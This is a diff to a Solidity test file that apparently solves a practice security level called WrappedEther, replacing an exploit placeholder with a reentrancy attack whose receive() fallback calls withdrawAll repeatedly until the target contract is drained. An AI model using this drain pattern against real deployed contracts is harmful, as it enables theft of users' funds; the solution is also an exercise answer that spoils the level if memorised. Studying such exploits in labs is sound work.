@@ -15,10 +15,17 @@ contract WrappedEtherTest is BaseTest {
         instance.deposit{value: 0.09 ether}(address(this));
     }
 
-    function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+    function testExploitLevel() public payable {
+        instance.deposit{value: msg.value}(address(this));
+        instance.withdrawAll();
 
         checkSuccess();
+    }
+
+    receive() override external payable {
+        if (address(instance).balance != 0) {
+            instance.withdrawAll();
+        }
     }
 
     function checkSuccess() internal view override {
